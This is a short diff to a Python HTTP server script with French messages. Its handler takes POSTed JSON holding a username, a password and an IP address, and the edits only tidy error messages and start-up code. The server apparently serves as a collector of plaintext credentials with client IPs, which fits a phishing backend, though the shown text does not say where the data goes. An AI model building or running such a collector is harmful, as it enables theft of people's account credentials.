@@ -25,7 +25,6 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 data = json.loads(post_data.decode('utf-8'))
 
                 now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-
                 username = data.get('username', 'Inconnu')
                 password = data.get('password', 'Inconnu')
                 ip_addr = data.get('ip', 'Non spécifiée')
@@ -54,18 +53,17 @@ class UnityRPHandler(SimpleHTTPRequestHandler):
                 self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
 
             except Exception as e:
-                print(f"ERREUR SERVEUR: {e}")
+                print(f"Erreur serveur : {e}")
                 self.send_response(500)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
-                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
+                self.wfile.write(json.dumps({"status": "error"}).encode('utf-8'))
         else:
-            self.send_error(404, "Page non trouvée")
+            self.send_error(404, "Non trouvé")
 
 if __name__ == '__main__':
     os.chdir(os.path.dirname(os.path.abspath(__file__)))
     port = int(os.environ.get('PORT', 10000))
-    server_address = ('', port)
-    httpd = HTTPServer(server_address, UnityRPHandler)
-    print(f"Serveur Python démarré sur le port {port}")
-    httpd.serve_forever()
+    server = HTTPServer(('', port), UnityRPHandler)
+    print(f"Serveur lancé sur le port {port}")
+    server.serve_forever()
